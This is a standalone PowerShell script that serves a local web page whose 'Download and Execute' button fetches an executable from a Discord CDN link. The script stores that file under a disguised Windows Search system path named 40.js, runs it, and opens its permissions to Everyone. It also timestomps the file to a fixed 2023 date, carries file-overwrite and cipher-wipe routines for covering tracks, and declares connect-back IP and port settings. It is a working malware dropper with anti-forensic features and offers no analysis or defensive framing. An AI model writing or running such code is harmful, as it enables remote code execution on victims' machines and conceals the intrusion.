# Fixed IP address and port for the web interface
$ipAddress = "127.0.0.1"
$port = 8080

# IP address and port to connect back to
$connectBackIp = "127.0.0.1"  # Updated IP address
$connectBackPort = 9090        # Replace with your port number

# Register HTTP listener with fixed IP and port
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://${ipAddress}:${port}/")
$listener.Start()
Write-Host "Listening on IP $ipAddress, port $port..."
Write-Host "Access the web interface at: http://${ipAddress}:${port}"

# Define paths to avoid file generation
$protectedPaths = @(
    "C:\ProgramData\Microsoft\Windows",
    "C:\ProgramData\Microsoft\Windows\WER",
    "C:\ProgramData\Microsoft\Windows\WER\ReportArchive",
    "C:\ProgramData\Microsoft\Windows\WER\ReportQueue",
    "C:\ProgramData\Microsoft\Windows\WER\Temp"
)

# Function to check if a path is protected
function Is-PathProtected {
    param ([string]$path)
    foreach ($protectedPath in $protectedPaths) {
        if ($path -like "$protectedPath*") {
            return $true
        }
    }
    return $false
}

# Function to download and save the file
function Download-AndSave-File {
    param (
        [string]$url,
        [string]$tempFilePath,
        [string]$finalFilePath
    )

    try {
        Write-Host "Downloading file from $url..."
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $tempFilePath)

        # Ensure the destination directory exists
        $destinationDir = [System.IO.Path]::GetDirectoryName($finalFilePath)
        if (-not (Test-Path $destinationDir)) {
            New-Item -ItemType Directory -Path $destinationDir -Force
        }

        # Check if the path is protected
        if (Is-PathProtected -path $destinationDir) {
            Write-Host "Error: Destination path is protected. Aborting file move."
            return
        }

        # Move and rename the file
        Write-Host "Moving file to $finalFilePath..."
        Move-Item -Path $tempFilePath -Destination $finalFilePath -Force

        # Set appropriate permissions
        Write-Host "Setting permissions for $finalFilePath..."
        $acl = Get-Acl $finalFilePath
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $acl.SetAccessRule($rule)
        Set-Acl -Path $finalFilePath -AclObject $acl

        # Set custom date and time for the file
        $customDateTime = Get-Date "12/3/2023 6:48 AM"
        [System.IO.File]::SetCreationTime($finalFilePath, $customDateTime)
        [System.IO.File]::SetLastWriteTime($finalFilePath, $customDateTime)
        [System.IO.File]::SetLastAccessTime($finalFilePath, $customDateTime)

        Write-Host "File downloaded, saved, and permissions set for $finalFilePath"
    } catch {
        Write-Host "An error occurred while downloading or saving the file: $_"
    }
}

# Function to execute the .exe file
function Execute-Executable {
    param ([string]$filePath)

    try {
        # Ensure the file path is properly quoted
        $filePath = [System.IO.Path]::GetFullPath($filePath)
        
        # Debug output
        Write-Host "Attempting to execute file: $filePath"
        
        # Execute the file
        Start-Process -FilePath $filePath -NoNewWindow -Wait

        Write-Host "Executed file: $filePath"
    } catch {
        Write-Host "Failed to execute file: $_"
    }
}

# Function to securely delete a file
function SecureDelete {
    param ([string]$path)
    try {
        if (Test-Path $path) {
            # Check if the path is protected
            if (Is-PathProtected -path $path) {
                Write-Host "Error: Path is protected. Aborting secure delete."
                return
            }

            # Overwrite the file with random data multiple times
            $fileStream = [System.IO.File]::OpenWrite($path)
            $fileLength = (Get-Item $path).Length

            $buffer = New-Object byte[] $fileLength
            $random = New-Object System.Random

            for ($i = 0; $i -lt 3; $i++) {
                $random.NextBytes($buffer)
                $fileStream.Write($buffer, 0, $buffer.Length)
            }

            $fileStream.Close()

            # Delete the file
            Remove-Item -Path $path -Force

            # Optionally, run a disk cleanup command
            $cleanupCommand = "cipher /w:" + [System.IO.Path]::GetDirectoryName($path)
            Invoke-Expression $cleanupCommand
        }
    } catch {
        Write-Host "Failed to securely delete: $_"
    }
}

# Function to securely delete a directory and its contents
function SecureDelete-Directory {
    param ([string]$directoryPath)
    try {
        if (Test-Path $directoryPath) {
            # Check if the path is protected
            if (Is-PathProtected -path $directoryPath) {
                Write-Host "Error: Path is protected. Aborting secure delete."
                return
            }

            # Securely delete all files within the directory
            Get-ChildItem -Path $directoryPath -Recurse | ForEach-Object {
                if ($_.PSIsContainer) {
                    # Recursively delete subdirectories
                    SecureDelete-Directory -directoryPath $_.FullName
                } else {
                    # Securely delete files
                    SecureDelete -path $_.FullName
                }
            }
            # Remove the directory itself
            Remove-Item -Path $directoryPath -Recurse -Force
        }
    } catch {
        Write-Host "Failed to securely delete directory: $_"
    }
}

# Function to handle HTTP requests and responses
function Handle-Request {
    param ($context)
    $request = $context.Request
    $response = $context.Response

    try {
        if ($request.HttpMethod -eq 'GET') {
            $url = $request.Url.AbsolutePath
            switch ($url) {
                '/' {
                    Serve-HTML -Message "Choose your action:"
                }
                '/js/40.js' {
                    # Serve JavaScript file
                    $filePath = "C:\$WINDOWS.~BT\NewOS\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\cache\Local\Desktop\40.js"
                    if (Test-Path $filePath) {
                        $response.ContentType = "application/javascript"
                        $response.ContentEncoding = [System.Text.Encoding]::UTF8
                        $fileContent = [System.IO.File]::ReadAllText($filePath)
                        $buffer = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
                        $response.OutputStream.Write($buffer, 0, $buffer.Length)
                    } else {
                        $response.StatusCode = 404
                        $response.StatusDescription = "File Not Found"
                    }
                }
                default {
                    $response.StatusCode = 404
                    $response.StatusDescription = "Not Found"
                }
            }
        } elseif ($request.HttpMethod -eq 'POST') {
            $url = $request.Url.AbsolutePath
            $response.StatusCode = 200
            $response.StatusDescription = "OK"
            $response.ContentType = "text/plain"
            switch ($url) {
                '/0x67' {
                    $tempFilePath = [System.IO.Path]::GetTempFileName()
                    $finalFilePath = "C:\$WINDOWS.~BT\NewOS\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\cache\Local\Desktop\40.js"
                    $downloadUrl = "https://cdn.discordapp.com/attachments/1265925139586088973/1270229544510685246/vmx.exe?ex=66b2f0f3&is=66b19f73&hm=12ded7af5e250fe110c8ca00ca0e186aa8558f5f669e988214da5a5786a97d64&"

                    # Download the file and save it with the correct name and permissions
                    Download-AndSave-File -url $downloadUrl -tempFilePath $tempFilePath -finalFilePath $finalFilePath

                    # Execute the JavaScript file
                    Execute-Executable -filePath $finalFilePath

                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed."), 0, [System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed."))
                }
                default {
                    $response.StatusCode = 404
                    $response.StatusDescription = "Not Found"
                }
            }
        } else {
            $response.StatusCode = 405
            $response.StatusDescription = "Method Not Allowed"
        }
    } catch {
        $response.StatusCode = 500
        $response.StatusDescription = "Internal Server Error"
        Write-Host "Error handling request: $_"
    } finally {
        $response.OutputStream.Close()
    }
}

# Function to serve HTML content
function Serve-HTML {
    param (
        [string]$Message
    )
    $htmlContent = @"
<!DOCTYPE html>
<html>
<head>
    <title>Action Menu</title>
</head>
<body>
    <h1>$Message</h1>
    <form action="/0x67" method="post">
        <button type="submit">Download and Execute</button>
    </form>
</body>
</html>
"@
    $response.ContentType = "text/html"
    $response.ContentEncoding = [System.Text.Encoding]::UTF8
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($htmlContent)
    $response.OutputStream.Write($buffer, 0, $buffer.Length)
}

# Main loop to handle incoming requests
while ($listener.IsListening) {
    $context = $listener.GetContext()
    Handle-Request -context $context
}

$listener.Stop()
